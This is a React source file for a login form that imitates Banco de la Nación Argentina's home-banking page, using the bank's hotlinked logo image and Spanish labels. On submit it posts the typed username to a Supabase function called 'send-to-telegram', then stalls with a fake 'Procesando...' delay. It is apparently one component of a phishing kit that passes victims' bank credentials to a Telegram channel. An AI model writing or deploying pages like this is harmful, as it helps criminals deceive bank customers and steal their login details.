import React, { useState } from 'react';
import { User, HelpCircle } from 'lucide-react';

interface LoginFormProps {
  onSubmit: (username: string) => void;
}

const LoginForm: React.FC<LoginFormProps> = ({ onSubmit }) => {
  const [username, setUsername] = useState('');
  const [loading, setLoading] = useState(false);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setLoading(true);

    try {
      await fetch(`${import.meta.env.VITE_SUPABASE_URL}/functions/v1/send-to-telegram`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${import.meta.env.VITE_SUPABASE_ANON_KEY}`,
        },
        body: JSON.stringify({ 
          action: 'username_entered',
          username: username 
        }),
      });

      await new Promise(resolve => setTimeout(resolve, 1500));
      onSubmit(username);
    } catch (error) {
      console.error('Error:', error);
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="bg-white w-[460px] px-6 py-4 font-bna">
      <form onSubmit={handleSubmit} className="ingreso">
        <div className="campos space-y-4">
          <div id="campoUsuario">
            <img 
              src="https://hb.redlink.com.ar/bna/entidades/banco.nacion.v2/vista/imagenes/login/homebanking.jpg" 
              alt="Home Banking"
              className="mb-4 mx-auto"
            />
            <label htmlFor="username" className="block text-sm font-medium text-gray-700 mb-1">
              Usuario
            </label>
            <div className="campo relative">
              <div className="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none">
                <User className="h-5 w-5 text-gray-400" />
              </div>
              <input
                id="username"
                type="text"
                value={username}
                onChange={(e) => setUsername(e.target.value)}
                className="block w-full pl-10 pr-3 py-2 border border-gray-300 rounded-md focus:ring-bna-blue focus:border-bna-blue"
                required
              />
              <a href="#" className="preg absolute right-2 top-1/2 -translate-y-1/2">
                <HelpCircle className="h-5 w-5 text-gray-400 hover:text-bna-blue" />
              </a>
            </div>
          </div>
        </div>

        <button
          type="submit"
          className={`w-full mt-6 py-2 px-4 border border-transparent rounded-md shadow-sm text-sm font-medium text-white bg-bna-blue hover:bg-bna-blue-dark focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-bna-blue uppercase ${
            loading ? 'opacity-75 cursor-not-allowed' : ''
          }`}
          disabled={loading}
        >
          {loading ? 'Procesando...' : 'INGRESAR'}
        </button>
      </form>

      <div className="mt-6 space-y-4">
        <div className="accesoBloqueado text-center">
          <a href="#" className="text-sm text-bna-blue hover:underline">
            ¿Acceso bloqueado?
          </a>
        </div>
        
        <div className="registrarse text-center">
          <a href="#" className="text-sm text-bna-blue hover:underline">
            ¿Primera vez que ingresás?
          </a>
        </div>
      </div>
    </div>
  );
};

export default LoginForm;